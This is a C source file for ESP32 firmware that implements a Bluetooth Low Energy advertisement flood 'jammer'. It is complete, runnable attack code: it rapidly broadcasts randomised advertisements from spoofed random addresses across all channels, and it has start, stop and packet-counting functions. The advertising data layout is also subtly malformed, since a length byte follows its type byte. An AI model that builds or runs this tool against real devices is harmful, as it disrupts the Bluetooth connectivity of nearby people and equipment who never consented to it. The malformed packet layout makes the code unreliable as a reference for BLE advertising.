/*
 * attack_bluetooth_jammer.c — BLE Advertisement Flood Jammer
 * 
 * FIXED: Graceful error handling if BT init fails (no crash)
 * FIXED: BT init state tracking to prevent double init
 * FIXED: Proper cleanup on stop
 */

#include "attack_bluetooth_jammer.h"
#include "esp_rom_sys.h"
#include "esp_random.h"
#include "esp_bt.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "BT_JAMMER";

static TaskHandle_t bt_jammer_task = NULL;
static volatile bool bt_jammer_running = false;
static volatile uint64_t bt_packets_sent = 0;
static volatile bool bt_initialized = false;  // FIX: Track BT state

static esp_ble_adv_params_t ble_adv_params = {
    .adv_int_min = 0x20,
    .adv_int_max = 0x40,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .channel_map = ADV_CHNL_ALL,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static void bt_jammer_task_func(void *pv) {
    bt_jammer_running = true;
    ESP_LOGI(TAG, "🔥 BLE Jammer started — flooding advertisements");

    uint8_t adv_data[31];
    uint64_t local_count = 0;

    while (bt_jammer_running) {
        memset(adv_data, 0, sizeof(adv_data));
        adv_data[0] = 0x02;
        adv_data[1] = 0x01;
        adv_data[2] = 0x06;  // LE General Discoverable
        adv_data[3] = 0x02;
        adv_data[4] = 0x0A;  // Shortened Local Name length
        
        // FIX: Use a recognizable pattern for the jammer name
        const char *name = "JAM";
        adv_data[5] = 0x09;  // TYPE: Complete Local Name
        adv_data[6] = strlen(name);
        memcpy(&adv_data[7], name, strlen(name));
        
        for (int i = 7 + strlen(name); i < 31; i++) {
            adv_data[i] = esp_random() & 0xFF;
        }

        // FIX: Random address for each advertisement
        uint8_t rand_addr[6];
        for (int i = 0; i < 6; i++) {
            rand_addr[i] = esp_random() & 0xFF;
        }
        rand_addr[0] = (rand_addr[0] & 0xFE) | 0x02;
        esp_ble_gap_set_rand_addr(rand_addr);

        // FIX: Check if bt_jammer_running before each API call
        if (!bt_jammer_running) break;
        
        esp_ble_gap_config_adv_data_raw(adv_data, sizeof(adv_data));
        esp_ble_gap_start_advertising(&ble_adv_params);
        bt_packets_sent++;
        local_count++;
        
        vTaskDelay(pdMS_TO_TICKS(20));  // FIX: Increased from 10ms
        
        if (!bt_jammer_running) break;
        esp_ble_gap_stop_advertising();
        vTaskDelay(pdMS_TO_TICKS(5));
        
        // FIX: Log every 500 packets
        if (local_count % 500 == 0) {
            ESP_LOGI(TAG, "BLE jammer alive: %llu packets", bt_packets_sent);
            vTaskDelay(pdMS_TO_TICKS(20));
        }
    }

    esp_ble_gap_stop_advertising();
    ESP_LOGI(TAG, "BLE Jammer stopped. Packets: %llu", bt_packets_sent);
    bt_jammer_task = NULL;
    vTaskDelete(NULL);
}

void bt_jammer_start(void) {
    if (bt_jammer_running) {
        ESP_LOGW(TAG, "BT jammer already running");
        return;
    }

    esp_bt_controller_status_t bt_status = esp_bt_controller_get_status();
    
    if (bt_status == ESP_BT_CONTROLLER_STATUS_IDLE) {
        ESP_LOGI(TAG, "Initializing BT controller for BLE jammer...");
        
        esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
        esp_err_t ret;

        ret = esp_bt_controller_init(&bt_cfg);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "BT controller init failed: %s — BT jammer unavailable", 
                     esp_err_to_name(ret));
            return;  // FIX: Return gracefully instead of crash
        }

        ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "BT controller enable failed: %s", esp_err_to_name(ret));
            esp_bt_controller_deinit();
            return;
        }

        ret = esp_bluedroid_init();
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Bluedroid init failed: %s", esp_err_to_name(ret));
            esp_bt_controller_disable();
            esp_bt_controller_deinit();
            return;
        }

        ret = esp_bluedroid_enable();
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Bluedroid enable failed: %s", esp_err_to_name(ret));
            esp_bluedroid_deinit();
            esp_bt_controller_disable();
            esp_bt_controller_deinit();
            return;
        }

        bt_initialized = true;  // FIX: Mark as initialized
        ESP_LOGI(TAG, "BT controller initialized OK for BLE jammer");
        
    } else if (bt_status == ESP_BT_CONTROLLER_STATUS_ENABLED) {
        ESP_LOGI(TAG, "BT already enabled — reusing");
        bt_initialized = true;
    } else {
        ESP_LOGW(TAG, "BT status = %d — may not work properly", bt_status);
        bt_initialized = false;
    }

    xTaskCreatePinnedToCore(bt_jammer_task_func, "bt_jammer", 4096, NULL, 5, 
                            &bt_jammer_task, 1);
    ESP_LOGI(TAG, "BLE Jammer task created (core 1)");
}

void bt_jammer_stop(void) {
    bt_jammer_running = false;
    if (bt_jammer_task) {
        vTaskDelay(pdMS_TO_TICKS(500));
        bt_jammer_task = NULL;
    }
    
    // FIX: Only disable if we initialized it
    if (bt_initialized) {
        esp_bluedroid_disable();
        esp_bluedroid_deinit();
        esp_bt_controller_disable();
        esp_bt_controller_deinit();
        bt_initialized = false;
        ESP_LOGI(TAG, "BT controller deinitialized");
    }
    
    ESP_LOGI(TAG, "BLE Jammer stopped");
}

bool bt_jammer_is_running(void) {
    return bt_jammer_running;
}

uint64_t bt_jammer_get_packets(void) {
    return bt_packets_sent;
}
